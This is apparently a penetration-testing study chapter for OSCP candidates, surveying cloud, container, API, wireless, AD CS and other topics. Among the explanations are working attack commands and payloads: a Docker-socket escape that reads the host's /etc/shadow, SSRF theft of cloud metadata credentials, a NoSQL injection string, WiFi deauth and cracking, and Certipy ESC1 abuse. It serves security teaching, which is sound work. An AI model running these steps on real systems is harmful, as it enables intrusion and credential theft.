# Supplementary Concepts and Emerging Technologies

This section covers topics beyond the core OSCP syllabus that make you a better penetration tester and security professional. The OSCP tests you on specific skills, but real-world engagements require broader knowledge. These topics also appear in interviews, senior roles, and advanced certifications (OSEP, OSED, CRTO).

---

## Cloud Security

### Why it matters

Most organizations are partially or fully in the cloud. Understanding cloud architecture is critical because:
- Many OSCP machines simulate cloud-adjacent scenarios (web apps, APIs)
- Job interviews almost always ask about cloud security
- Post-OSCP certifications (like AWS Security Specialty) build on these fundamentals

### AWS (Amazon Web Services)

**Key concepts:**

```
IAM (Identity and Access Management)
  - Users, groups, roles, policies
  - Overly permissive IAM policies are the #1 AWS security issue
  - An IAM user with AdministratorAccess is like Domain Admin in AD

S3 Buckets
  - Cloud file storage
  - Misconfigured buckets are publicly accessible (data leaks)
  - Check: aws s3 ls s3://bucket-name --no-sign-request

EC2 Instances
  - Virtual machines in the cloud
  - Instance metadata: http://169.254.169.254/latest/meta-data/
  - SSRF attacks can read the metadata endpoint and steal IAM credentials

Lambda
  - Serverless functions — code runs without a server
  - Injection attacks apply (same as web apps)
  - Environment variables often contain secrets

Secrets Manager / Parameter Store
  - Where credentials SHOULD be stored (but aren't always)
```

**Common AWS attack paths:**

```
1. Public S3 bucket → download sensitive files → credentials → pivot
2. SSRF on web app → hit metadata endpoint → steal IAM role creds → access AWS services
3. Exposed access keys in source code / GitHub → full AWS access
4. Lambda function with excessive permissions → escalate within AWS
```

**Tools:**

```bash
# AWS CLI
aws configure                               # set up credentials
aws s3 ls                                   # list S3 buckets
aws s3 ls s3://bucket-name                  # list bucket contents
aws iam list-users                          # list IAM users
aws ec2 describe-instances                  # list EC2 instances

# Pacu (AWS exploitation framework)
pacu                                        # like Metasploit for AWS

# ScoutSuite (cloud security auditing)
scout aws                                   # audit AWS configuration

# CloudFox (find attack paths in AWS)
cloudfox aws all-checks --profile default
```

### Azure

```
Azure AD (now Entra ID)
  - Microsoft's cloud identity system
  - Syncs with on-premise AD (hybrid environments)
  - Azure AD Connect misconfigurations can expose credentials

Azure VMs
  - Similar to EC2 — metadata at http://169.254.169.254/

Azure Blob Storage
  - Similar to S3 — misconfigured containers are public

Azure Key Vault
  - Stores secrets, certificates, keys
  - Overly permissive access policies expose secrets
```

---

## Container Security (Docker and Kubernetes)

### Why it matters

You work with Docker and Kubernetes daily. Understanding their security implications is essential.

### Docker security concepts

```
Container escape
  - A container is NOT a security boundary
  - If you get root inside a container, you can often escape to the host
  - Docker socket (/var/run/docker.sock) exposed inside container = instant host access

Privileged containers
  - docker run --privileged gives the container almost full host access
  - An attacker inside a privileged container can mount the host filesystem

Docker socket exposure
  - If /var/run/docker.sock is mounted inside a container:
    docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu
    # You now have the host's root filesystem mounted at /host

Image security
  - Base images with known CVEs
  - Secrets baked into images (docker history shows layers)
  - Public images from Docker Hub may contain malware
```

### Docker escape techniques

```bash
# Check if you're in a Docker container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# If the Docker socket is mounted
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
# You're now root on the HOST

# If the container is privileged
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
ls /tmp/hostfs    # host filesystem
cat /tmp/hostfs/etc/shadow

# Abusing Linux capabilities in containers
capsh --print     # check your capabilities
# CAP_SYS_ADMIN → can mount filesystems
# CAP_NET_ADMIN → can sniff network traffic
```

### Kubernetes security

```
Pod security
  - Pods can have service accounts with excessive permissions
  - Default service account token at /var/run/secrets/kubernetes.io/serviceaccount/token
  - Can be used to talk to the Kubernetes API

RBAC (Role-Based Access Control)
  - Misconfigured RBAC grants too much access
  - cluster-admin role = god mode

Secrets
  - Kubernetes secrets are base64 encoded, NOT encrypted
  - Anyone who can read secrets has the plaintext
  - kubectl get secrets -o yaml → decode the values

etcd
  - The Kubernetes database — stores ALL cluster state
  - If etcd is exposed (port 2379), you can read everything
```

---

## API Security

### Why it matters

Modern web applications are built on APIs. The OSCP increasingly features API-based targets. Understanding API security expands your attack surface significantly.

### REST API basics

```
HTTP Methods:
  GET     — read data
  POST    — create data
  PUT     — update data (replace entire resource)
  PATCH   — update data (partial update)
  DELETE  — delete data

Authentication:
  API keys      — static keys in headers or query params
  Bearer tokens — JWT or OAuth tokens in Authorization header
  Basic auth    — base64(username:password) in Authorization header
  No auth       — the API is open (misconfiguration)
```

### Common API vulnerabilities

```
BOLA (Broken Object Level Authorization)
  GET /api/users/123/profile     ← your profile
  GET /api/users/124/profile     ← someone else's profile (if it works, BOLA)
  Change the ID and access other users' data

BFLA (Broken Function Level Authorization)
  GET /api/users/                ← allowed (your data)
  DELETE /api/users/124          ← should be admin only, but works

Mass Assignment
  POST /api/users/register
  {"username":"me","password":"pass","role":"admin"}
  ← If the API accepts the "role" field, you just made yourself admin

Excessive Data Exposure
  GET /api/users/123
  Returns: ALL fields including SSN, password hash, internal IDs
  ← API returns too much data, frontend hides it but API doesn't

Rate Limiting
  No rate limiting on /api/login → brute force credentials
  No rate limiting on /api/password-reset → enumerate valid emails

Injection
  SQL injection through API parameters (same as web, different format)
  NoSQL injection: {"username":{"$ne":""},"password":{"$ne":""}}
```

### API enumeration

```bash
# Check common API paths
curl http://TARGET/api
curl http://TARGET/api/v1
curl http://TARGET/api/v2
curl http://TARGET/api/docs
curl http://TARGET/swagger
curl http://TARGET/swagger.json
curl http://TARGET/openapi.json
curl http://TARGET/graphql

# If you find Swagger/OpenAPI docs, you have the full API specification
# Every endpoint, every parameter, every data model

# Brute force API endpoints
gobuster dir -u http://TARGET/api -w /usr/share/wordlists/dirb/common.txt

# Test for BOLA
curl http://TARGET/api/users/1
curl http://TARGET/api/users/2    # can you access other users?

# Test authentication
curl http://TARGET/api/admin      # should be blocked without auth
curl http://TARGET/api/admin -H "Authorization: Bearer TOKEN"
```

---

## Wireless Security

### Wireless concepts

```
WEP  — broken, crackable in minutes (legacy — rarely seen now)
WPA  — uses TKIP, vulnerable to dictionary attacks on the handshake
WPA2 — uses AES-CCMP, current standard, still vulnerable to handshake capture + cracking
WPA3 — latest, uses SAE (Simultaneous Authentication of Equals), much harder to crack

PMKID attack — newer attack, doesn't require capturing a handshake
  Just need one frame from the AP
  Crack the PMKID hash offline

Evil Twin — set up a fake AP with the same SSID
  Victims connect to your AP
  You capture their credentials
  Especially effective at public WiFi locations

Deauth attack — send deauthentication frames to disconnect clients
  Forces them to reconnect (and you capture the handshake)
  Or forces them onto your Evil Twin
```

### Tools

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Capture a handshake
sudo airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0mon
# In another terminal, send deauth to force a reconnect:
sudo aireplay-ng -0 5 -a AP_MAC wlan0mon

# Crack the handshake
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt

# PMKID attack (hashcat)
hcxdumptool -i wlan0mon -o output.pcapng
hcxpcapngtool output.pcapng -o hash.22000
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

---

## Cryptography Essentials

### Concepts to understand

```
Symmetric encryption  — same key encrypts and decrypts (AES, DES, 3DES)
Asymmetric encryption — public key encrypts, private key decrypts (RSA, ECC)
Hashing              — one-way function, no decryption (MD5, SHA1, SHA256, bcrypt)
Digital signatures    — prove authenticity (sign with private key, verify with public key)

TLS/SSL
  - Encrypts HTTP → HTTPS
  - Uses certificates (asymmetric) to establish a shared key (symmetric)
  - TLS 1.2 and 1.3 are current standards
  - SSL 3.0 and TLS 1.0/1.1 are deprecated and vulnerable

PKI (Public Key Infrastructure)
  - Certificate Authorities (CAs) issue digital certificates
  - Certificates bind a public key to an identity
  - If you can compromise a CA, you can forge certificates (see AD CS attacks)
```

### Practical crypto for pentesting

```bash
# Generate a hash
echo -n "password" | md5sum
echo -n "password" | sha256sum

# Encode/decode base64
echo "hello" | base64
echo "aGVsbG8K" | base64 -d

# Generate an SSH key pair
ssh-keygen -t ed25519 -C "pentest"

# Encrypt a file with openssl
openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.txt
openssl enc -aes-256-cbc -d -in encrypted.txt -out decrypted.txt

# Check SSL certificate
openssl s_client -connect TARGET:443
# Shows certificate details — might reveal internal hostnames

# Check for weak SSL/TLS
nmap --script ssl-enum-ciphers -p 443 TARGET
sslscan TARGET
testssl.sh TARGET
```

---

## OSINT (Open Source Intelligence)

### What it is

Gathering information from publicly available sources before engaging a target. Not heavily tested on the OSCP (the exam gives you IPs, not company names), but critical for real engagements and interviews.

### Techniques and tools

```
Passive reconnaissance (no direct interaction with the target):
  - Google dorking: site:target.com filetype:pdf
  - Shodan: search for internet-facing services
  - Certificate Transparency logs: crt.sh
  - DNS history: SecurityTrails, DNSDumpster
  - GitHub: search for leaked credentials, API keys
  - LinkedIn: employee names → username enumeration
  - Wayback Machine: archived versions of websites

Google dorks:
  site:target.com                          Only results from this domain
  site:target.com filetype:pdf             PDF files
  site:target.com filetype:xlsx            Excel files
  site:target.com inurl:admin              Pages with "admin" in the URL
  site:target.com intitle:"index of"       Open directory listings
  "password" site:target.com               Pages containing "password"
  site:github.com "target.com" password    Leaked creds on GitHub

Shodan:
  hostname:target.com                      Find all internet-facing services
  org:"Target Company"                     Services by organization
  port:3389 country:US                     RDP servers in the US
  vuln:CVE-2021-44228                      Servers vulnerable to Log4Shell
```

---

## Malware Analysis Basics

### Static analysis (don't run it)

```bash
# File type identification
file suspicious.exe
file suspicious.pdf

# Strings — extract readable text
strings suspicious.exe | grep -i "http\|password\|cmd\|powershell"

# Check against known malware
md5sum suspicious.exe
sha256sum suspicious.exe
# Submit hash to VirusTotal

# PE file analysis (Windows executables)
exiftool suspicious.exe
objdump -d suspicious.exe | head -100
```

### Dynamic analysis (run it safely)

```
Run in an isolated VM (snapshot first)
Monitor:
  - Network connections (Wireshark, tcpdump)
  - File system changes (Process Monitor)
  - Registry changes (Process Monitor)
  - Process creation (Process Monitor, Procmon)
  - DNS queries (Wireshark)

Tools:
  - Remnux (Linux distro for malware analysis)
  - FlareVM (Windows VM pre-built for analysis)
  - Any.Run (online sandbox)
  - Hybrid Analysis (online sandbox)
```

---

## Social Engineering

### Concepts

```
Phishing          — fraudulent emails to steal credentials or deliver malware
Spear phishing    — targeted phishing against specific individuals
Vishing           — voice phishing (phone calls)
Smishing          — SMS phishing
Pretexting        — creating a fabricated scenario to get information
Baiting           — leaving infected USB drives for victims to plug in
Tailgating        — physically following someone through a secure door
```

### Email security headers

```
SPF  (Sender Policy Framework)   — which servers can send email for a domain
DKIM (DomainKeys Identified Mail) — cryptographic signature on emails
DMARC (Domain-based Message Authentication) — policy for handling failed SPF/DKIM

# Check a domain's email security
dig TXT domain.com | grep spf
dig TXT _dmarc.domain.com
dig TXT selector._domainkey.domain.com
```

---

## Zero Trust Architecture

### The concept

Traditional security: "trust everything inside the network, block everything outside" (castle and moat). Zero Trust: "never trust, always verify" regardless of network location.

```
Principles:
  1. Verify explicitly — authenticate and authorize every access request
  2. Least privilege — give minimum access needed
  3. Assume breach — design as if attackers are already inside

Implementation:
  - Multi-factor authentication (MFA) everywhere
  - Micro-segmentation (isolate workloads, don't trust lateral traffic)
  - Continuous verification (don't just check once at login)
  - Encrypted communications (even inside the network)
  - Identity-based access (not network-based)
```

### Why pentesters should understand it

Zero Trust environments are harder to pivot through. Understanding the architecture helps you find the gaps — because no implementation is perfect:
- MFA bypass techniques (token theft, MFA fatigue)
- Identity provider attacks (compromise the IdP, compromise everything)
- Misconfigurations in micro-segmentation
- Legacy systems that weren't migrated to Zero Trust

---

## Emerging Attack Surfaces

### AI/ML Security

```
Prompt injection     — manipulating AI systems through crafted inputs
Data poisoning       — corrupting training data to change model behavior
Model extraction     — stealing a proprietary model through its API
Adversarial examples — inputs designed to fool ML classifiers

# Why it matters: AI is being integrated into security tools,
# authentication systems, and business processes. Attacking these
# systems is a growing area of pentesting.
```

### IoT (Internet of Things)

```
Attack surface:
  - Default credentials (admin/admin on IP cameras, routers)
  - Unencrypted protocols (Telnet, HTTP, MQTT without TLS)
  - Firmware vulnerabilities (extract firmware, find hardcoded creds)
  - Physical access (UART, JTAG debug interfaces)

Tools:
  - Shodan (find exposed IoT devices)
  - Firmware analysis (binwalk to extract filesystem)
  - nmap scripts for IoT protocols
```

### Supply Chain Attacks

```
What: Compromise a vendor/library/tool that the target depends on
Examples:
  - SolarWinds (2020) — malware inserted into software update
  - Log4Shell (2021) — vulnerability in a logging library used by thousands of apps
  - 3CX (2023) — compromised VoIP software installer
  - xz Utils (2024) — backdoor in Linux compression utility

Why it matters: You can't just secure your own code — you need to
audit dependencies, verify supply chain integrity, and monitor for
compromised components.
```

### Active Directory Certificate Services (AD CS)

```
What: PKI infrastructure built into Active Directory
Why it matters: Misconfigured certificate templates allow domain privilege escalation

Common misconfigurations:
  - ESC1: Template allows any user to request a certificate for any other user
  - ESC4: Template ACL allows modification → change template to enable ESC1
  - ESC8: Web enrollment endpoint vulnerable to NTLM relay

Tools:
  - Certipy (Linux): certipy find -u user -p pass -dc-ip DC_IP
  - Certify (Windows): Certify.exe find /vulnerable

# ESC1 exploitation
certipy req -u user -p pass -ca CA_NAME -template VULN_TEMPLATE -upn administrator@domain.local
certipy auth -pfx administrator.pfx
# You now have administrator's NTLM hash
```

AD CS attacks are increasingly common on the OSCP and in real engagements. If you see port 80/443 on a DC with "Active Directory Certificate Services" in the response, this is a high-priority target.

---

## Incident Response and Blue Team Awareness

Understanding the defender's perspective makes you a better attacker.

### What defenders look for

```
Authentication logs:
  - Multiple failed logins (brute force detection)
  - Successful login from unusual location/time
  - Password spraying patterns (one password, many users)

Process monitoring:
  - cmd.exe spawned by w3wp.exe (IIS → shell)
  - powershell.exe with encoded commands
  - certutil.exe downloading files
  - Unknown processes making network connections

Network monitoring:
  - Large amounts of data leaving the network (exfiltration)
  - Connections to known bad IPs
  - DNS tunneling (unusually long DNS queries)
  - Lateral movement (SMB connections between workstations)

File system monitoring:
  - New files in web roots
  - Modified system binaries
  - Cleared event logs (a strong indicator of compromise)
```

### How this helps your pentesting

```
Knowing what triggers alerts helps you:
  - Choose stealthier techniques when needed
  - Understand why something might stop working mid-engagement
  - Write better reports (include detection recommendations)
  - Prepare for interview questions about both offensive and defensive
```

---

## Certifications Roadmap After OSCP

```
IMMEDIATE NEXT STEPS:
  OSEP (PEN-300) — Advanced Evasion Techniques & Breaching Defenses
  CRTO (Certified Red Team Operator) — Cobalt Strike, C2 frameworks
  
SPECIALIZATION:
  OSED (EXP-301) — Windows exploit development, buffer overflows
  OSWE (WEB-300) — Advanced web application attacks
  OSDA (SOC-200) — Security Operations and Defensive Analysis
  
CLOUD:
  AWS Security Specialty
  Azure Security Engineer Associate (AZ-500)
  
MANAGEMENT/STRATEGY:
  CISSP — Broad security management certification
  CISM — Information security management
```

---

## Study Resources for Supplementary Topics

```
Cloud Security:
  - "Cloud Security Handbook" by Eyal Estrin
  - AWS Security Specialty study guide
  - Hacking the Cloud (hackingthe.cloud)
  - CloudGoat (vulnerable AWS environment for practice)

Container Security:
  - "Container Security" by Liz Rice
  - Docker security documentation
  - KubeGoat (vulnerable Kubernetes environment)

API Security:
  - OWASP API Security Top 10
  - PortSwigger Web Security Academy (API labs)
  - Damn Vulnerable GraphQL Application

General:
  - SANS Reading Room (free research papers)
  - Krebs on Security (current events)
  - The Hacker News (security news)
  - SANS Internet Storm Center
```
